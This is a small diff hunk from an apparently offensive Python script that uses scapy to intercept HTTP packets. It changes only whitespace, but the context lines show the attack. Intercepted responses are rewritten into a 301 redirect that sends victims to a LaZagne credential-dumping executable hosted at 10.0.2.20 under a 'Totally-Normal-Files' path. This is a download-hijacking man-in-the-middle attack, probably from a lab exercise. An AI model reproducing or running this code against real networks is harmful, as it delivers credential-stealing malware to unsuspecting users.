@@ -33,7 +33,7 @@ def process_packet(packet):
                 replace_url = "http://10.0.2.20/Totally-Normal-Files/laZagne.exe"
                 scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\r\nLocation: " + replace_url + "\n\n"
                 modified_packet = set_load(scapy_packet)
-
+                
                 packet.set_payload(bytes(modified_packet))
     packet.accept()
 
